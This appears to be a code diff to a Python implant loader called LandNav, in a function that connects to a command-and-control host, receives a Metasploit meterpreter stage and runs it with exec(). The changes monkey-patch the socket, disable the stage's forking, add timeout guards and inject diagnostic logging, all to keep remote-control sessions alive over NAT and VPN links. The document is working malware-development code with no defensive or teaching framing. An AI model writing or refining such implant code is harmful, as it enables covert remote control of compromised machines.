@@ -454,14 +454,6 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             s.settimeout(None)
 
             # ── Socket hardening for NAT/VPN resilience ─────────
-            # TCP_NODELAY: disable Nagle so MSF TLV packets are sent
-            # immediately, not coalesced with future writes.  Without
-            # this, the server may delay a 32-byte TLV header waiting
-            # for more data, causing the stage's recv to return a
-            # partial header on a lossy link.
-            # SO_KEEPALIVE: send TCP keepalive probes so stateful
-            # firewalls / NAT tables don't expire the connection
-            # during idle periods between operator commands.
             try:
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
@@ -477,107 +469,123 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             except (OSError, AttributeError) as e:
                 log.warning("Socket hardening partial: %s", e)
 
-            # The MSF Python meterpreter stage calls os.fork() to
-            # daemonize itself (TRY_TO_FORK = True).  The parent
-            # returns from exec() instantly; the child runs the
-            # dispatch loop in a separate process.  This breaks our
-            # session management: LandNav closes the socket, re-
-            # cascades, and interferes with the child.
+            # ── Socket monkey-patch: MSG_WAITALL on ALL recv ────
+            # v0.4.9 tried to add MSG_WAITALL by string-replacing
+            # the stage source.  This silently fails when the MSF
+            # stage uses different formatting, variable names, or
+            # is minified/obfuscated.  Instead, monkey-patch the
+            # socket itself — works regardless of stage source.
             #
-            # Fix: patch the stage source to disable fork+setsid.
-            # The dispatch loop runs directly in this thread —
-            # exec() blocks for the session lifetime.
-            if isinstance(prepared, bytes):
-                prepared = prepared.replace(
-                    b'TRY_TO_FORK = True', b'TRY_TO_FORK = False')
-                prepared = prepared.replace(
-                    b'os.setsid()', b'pass  # landnav: keep tty')
-            else:
-                prepared = prepared.replace(
-                    'TRY_TO_FORK = True', 'TRY_TO_FORK = False')
-                prepared = prepared.replace(
-                    'os.setsid()', 'pass  # landnav: keep tty')
-            log.info("Meterpreter stage patched: fork disabled, "
-                     "setsid disabled — dispatch runs in-process")
+            # MSG_WAITALL makes recv block until ALL requested bytes
+            # arrive.  This is safe for MSF's TLV protocol: the
+            # server always sends a complete packet before waiting
+            # for a response, so all bytes WILL arrive.
+            _orig_recv = s.recv
+            _recv_count = [0]
 
-            # ── Stage patch: fix communication_has_expired 0-timeout ─
-            # The stage's communication_has_expired property does:
-            #   return self.communication_last + self.communication_timeout < time.time()
-            # With communication_timeout=0, this is True immediately
-            # after any idle period.  session_has_expired handles 0
-            # correctly with an explicit guard, but communication_has_expired
-            # does NOT.  Patch the stage to add the same > 0 guard.
-            # This makes LandNav resilient regardless of handler config.
-            _comm_old = ('self.communication_last + '
-                         'self.communication_timeout < time.time()')
-            _comm_new = ('self.communication_timeout > 0 and '
-                         'self.communication_last + '
-                         'self.communication_timeout < time.time()')
-            if isinstance(prepared, bytes):
-                prepared = prepared.replace(
-                    _comm_old.encode(), _comm_new.encode())
-            else:
-                prepared = prepared.replace(_comm_old, _comm_new)
-            log.info("Meterpreter stage patched: communication_has_expired "
-                     "zero-timeout guard added")
+            def _waitall_recv(bufsize, flags=0):
+                _recv_count[0] += 1
+                try:
+                    data = _orig_recv(bufsize, flags | socket.MSG_WAITALL)
+                    if _recv_count[0] <= 20:
+                        log.debug("recv #%d: requested=%d got=%d",
+                                  _recv_count[0], bufsize,
+                                  len(data) if data else 0)
+                    return data
+                except Exception as e:
+                    log.warning("recv #%d error: %s", _recv_count[0], e)
+                    raise
 
-            # ── Stage patch: MSG_WAITALL on TLV header recv ──────
-            # The stage's TcpTransport._get_packet() does a single
-            #   self.socket.recv(PACKET_HEADER_SIZE)
-            # to read the 32-byte TLV header.  Over a NAT/VPN link
-            # this can return a partial header (< 32 bytes).  The
-            # stage then hits:
-            #   if len(packet) != PACKET_HEADER_SIZE: return None
-            # silently dropping the packet.  The remaining bytes
-            # arrive on the next call — also partial, also dropped.
-            # The framing is now permanently broken; every subsequent
-            # command from MSF goes unanswered.
-            #
-            # Fix: add socket.MSG_WAITALL to the recv call.  This
-            # tells the kernel to block until all 32 bytes arrive,
-            # preventing partial-header framing errors entirely.
-            # The target string is unique in _get_packet (the payload
-            # recv uses pkt_length, not PACKET_HEADER_SIZE).
-            _hdr_old = 'self.socket.recv(PACKET_HEADER_SIZE)'
-            _hdr_new = ('self.socket.recv(PACKET_HEADER_SIZE, '
-                        'socket.MSG_WAITALL)')
-            if isinstance(prepared, bytes):
-                prepared = prepared.replace(
-                    _hdr_old.encode(), _hdr_new.encode())
-            else:
-                prepared = prepared.replace(_hdr_old, _hdr_new)
-            log.info("Meterpreter stage patched: MSG_WAITALL on "
-                     "TLV header recv — prevents partial-read "
-                     "framing errors")
+            s.recv = _waitall_recv
+            log.info("Socket recv monkey-patched: MSG_WAITALL on "
+                     "every recv — no string matching required")
 
-            # ── Stage patch: enable debug logging ────────────────
-            # The stage has DEBUGGING = False which makes every
-            # debug_traceback() call a no-op.  The bare except: in
-            # Transport.get_packet() silently swallows all packet
-            # recv/decrypt errors.  Enabling DEBUGGING makes those
-            # calls actually write tracebacks to a file, giving us
-            # permanent visibility into the meterpreter's internals.
-            _dbg_file = '/tmp/landnav_met_debug.log'
-            if isinstance(prepared, bytes):
-                prepared = prepared.replace(
-                    b'DEBUGGING = False',
-                    (f'DEBUGGING = True; '
-                     f'DEBUGGING_LOG_FILE_PATH = "{_dbg_file}"'
-                     ).encode())
-            else:
-                prepared = prepared.replace(
-                    'DEBUGGING = False',
-                    f'DEBUGGING = True; '
-                    f'DEBUGGING_LOG_FILE_PATH = "{_dbg_file}"')
-            log.info("Meterpreter stage patched: debug logging "
-                     "enabled → %s", _dbg_file)
+            # ── Socket monkey-patch: sendall for send ───────────
+            # MSF stage may use send() (partial) instead of sendall().
+            # Wrap send to retry on partial write.
+            _orig_send = s.send
 
-            # ── Diagnostic: log the timeout values MSF sends ─────
-            # The stage sets communication_timeout from the handler's
-            # SessionCommunicationTimeout TLV.  0 means "never" to MSF
-            # but the stage may interpret it as "expire immediately."
-            # This diagnostic writes the actual values to a file on
-            # the implant so the next run gives hard data.
+            def _full_send(data, flags=0):
+                total = 0
+                mv = memoryview(data)
+                while total < len(data):
+                    sent = _orig_send(mv[total:], flags)
+                    if sent <= 0:
+                        raise OSError("send returned %d" % sent)
+                    total += sent
+                return total
+
+            s.send = _full_send
+
+            # ── Log stage source for diagnostics ────────────────
+            _stage_text = (prepared.decode('latin-1', errors='replace')
+                           if isinstance(prepared, bytes) else prepared)
+            log.info("Stage source (first 300 chars): %r",
+                     _stage_text[:300])
+            log.info("Stage source (last 200 chars): %r",
+                     _stage_text[-200:])
+            # Log whether key identifiers exist in stage
+            for _marker, _label in [
+                ('TRY_TO_FORK', 'fork control'),
+                ('PACKET_HEADER_SIZE', 'TLV header const'),
+                ('DEBUGGING', 'debug flag'),
+                ('communication_timeout', 'comm timeout'),
+                ('met.run()', 'dispatch entry'),
+                ('_get_packet', 'packet reader'),
+                ('_send_packet', 'packet sender'),
+                ('PythonMeterpreter', 'meterpreter class'),
+                ('TcpTransport', 'TCP transport'),
+                ('HttpTransport', 'HTTP transport'),
+                ('aes_encrypt', 'AES encrypt'),
+                ('xor_bytes', 'XOR encrypt'),
+            ]:
+                _found = _marker in _stage_text
+                log.info("Stage marker [%s] %-20s: %s",
+                         "✓" if _found else "✗", _label, _marker)
+
+            # ── Source patches (best-effort, verified) ──────────
+            # These are defense-in-depth alongside the socket
+            # monkey-patch.  Each patch logs whether it matched.
+            _patches_applied = []
+            _patches_missed = []
+
+            def _patch(old, new, label):
+                nonlocal prepared
+                if isinstance(prepared, bytes):
+                    _o, _n = old.encode(), new.encode()
+                else:
+                    _o, _n = old, new
+                if _o in (prepared if isinstance(prepared, (str, bytes))
+                          else b''):
+                    prepared = prepared.replace(_o, _n)
+                    _patches_applied.append(label)
+                else:
+                    _patches_missed.append(label)
+
+            _patch('TRY_TO_FORK = True', 'TRY_TO_FORK = False',
+                   'fork-disable')
+            _patch('os.setsid()', 'pass  # landnav: keep tty',
+                   'setsid-disable')
+            _patch(
+                'self.communication_last + '
+                'self.communication_timeout < time.time()',
+                'self.communication_timeout > 0 and '
+                'self.communication_last + '
+                'self.communication_timeout < time.time()',
+                'comm-expire-guard')
+            _patch('DEBUGGING = False',
+                   'DEBUGGING = True; DEBUGGING_LOG_FILE_PATH = '
+                   '"/tmp/landnav_met_debug.log"',
+                   'debug-enable')
+
+            if _patches_applied:
+                log.info("Source patches applied: %s",
+                         ", ".join(_patches_applied))
+            if _patches_missed:
+                log.warning("Source patches DID NOT MATCH (stage format "
+                            "differs): %s", ", ".join(_patches_missed))
+
+            # ── Diagnostic injection around met.run() ───────────
             _diag_pre = (
                 'open("/tmp/landnav_met_diag.log","a").write('
                 '"[%s] INIT comm_timeout=%s sess_expiry=%s'
@@ -595,15 +603,27 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 '__import__("datetime").datetime.now(),'
                 'getattr(met,"running","?")))'
             )
+            _diag_old = 'met.run()'
+            _diag_new = _diag_pre + 'met.run()' + _diag_post
             if isinstance(prepared, bytes):
-                prepared = prepared.replace(
-                    b'met.run()',
-                    _diag_pre.encode() + b'met.run()' + _diag_post.encode())
+                if b'met.run()' in prepared:
+                    prepared = prepared.replace(
+                        b'met.run()',
+                        _diag_new.encode())
+                    log.info("Diagnostic injection: applied around "
+                             "met.run()")
+                else:
+                    log.warning("Diagnostic injection: 'met.run()' "
+                                "not found in stage source")
             else:
-                prepared = prepared.replace(
-                    'met.run()',
-                    _diag_pre + 'met.run()' + _diag_post)
-            log.info("Diagnostic logging injected around met.run()")
+                if 'met.run()' in prepared:
+                    prepared = prepared.replace(
+                        'met.run()', _diag_new)
+                    log.info("Diagnostic injection: applied around "
+                             "met.run()")
+                else:
+                    log.warning("Diagnostic injection: 'met.run()' "
+                                "not found in stage source")
 
             # ── Threaded exec ────────────────────────────────────
             # Run exec() in a daemon thread so SIGINT/SIGTERM can
